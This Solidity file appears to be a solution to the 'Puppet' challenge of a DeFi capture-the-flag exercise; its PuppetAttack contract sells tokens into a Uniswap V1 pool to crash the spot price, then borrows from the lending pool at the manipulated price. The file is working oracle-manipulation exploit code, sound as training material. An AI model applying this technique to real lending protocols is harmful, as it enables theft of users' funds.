// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { PuppetPool } from "../puppet/PuppetPool.sol";
import { DamnValuableToken } from "../DamnValuableToken.sol";

interface UniswapExchangeInterface {
    function tokenToEthSwapInput(
        uint256 tokens_sold,
        uint256 min_eth,
        uint256 deadline
    ) external returns (uint256 eth_bought);
}

contract PuppetAttack {
    constructor(
        PuppetPool lendingPool,
        UniswapExchangeInterface uniswapExchange,
        DamnValuableToken token,
        uint256 amountToSell,
        uint256 amountToBorrow,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) payable {
        token.permit(msg.sender, address(this), amountToSell, deadline, v, r, s);
        token.transferFrom(msg.sender, address(this), amountToSell);
        token.approve(address(uniswapExchange), amountToSell);
        uniswapExchange.tokenToEthSwapInput(amountToSell, 1, deadline);
        lendingPool.borrow{ value: msg.value }(amountToBorrow, msg.sender);
    }

    receive() external payable {}
}
